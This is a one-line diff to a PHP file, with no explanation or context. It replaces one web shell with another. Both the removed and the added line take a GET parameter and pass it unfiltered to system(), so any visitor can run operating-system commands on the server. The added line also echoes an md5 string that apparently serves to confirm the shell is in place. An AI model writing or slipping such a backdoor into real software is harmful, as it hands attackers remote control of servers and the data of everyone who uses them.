@@ -1,1 +1,1 @@
-<?php if(isset($_GET['pingtoufuck!'])){system($_GET['pingtoufuck!']);} ?>
+<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} echo md5('verify'); ?>
